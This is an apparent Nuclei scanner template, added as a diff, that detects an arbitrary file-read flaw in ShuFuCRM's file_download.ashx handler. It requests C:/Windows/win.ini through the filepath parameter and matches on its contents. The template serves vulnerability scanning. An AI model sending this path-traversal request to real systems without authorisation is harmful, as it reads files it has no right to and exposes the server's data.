@@ -1,0 +1,28 @@
+id: ShuFuCRM-file_download-ReadAnyFile
+
+info:
+  name: ShuFuCRM-file_download-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    ShuFuCRM-file_download-ReadAnyFile.
+
+http:
+  - raw:
+      - |
+        GET /Web/common/Handler/file_download.ashx?filepath=C:/Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - fonts
+          - Mail
+        condition: and
+
+      - type: status
+        status:
+          - 200
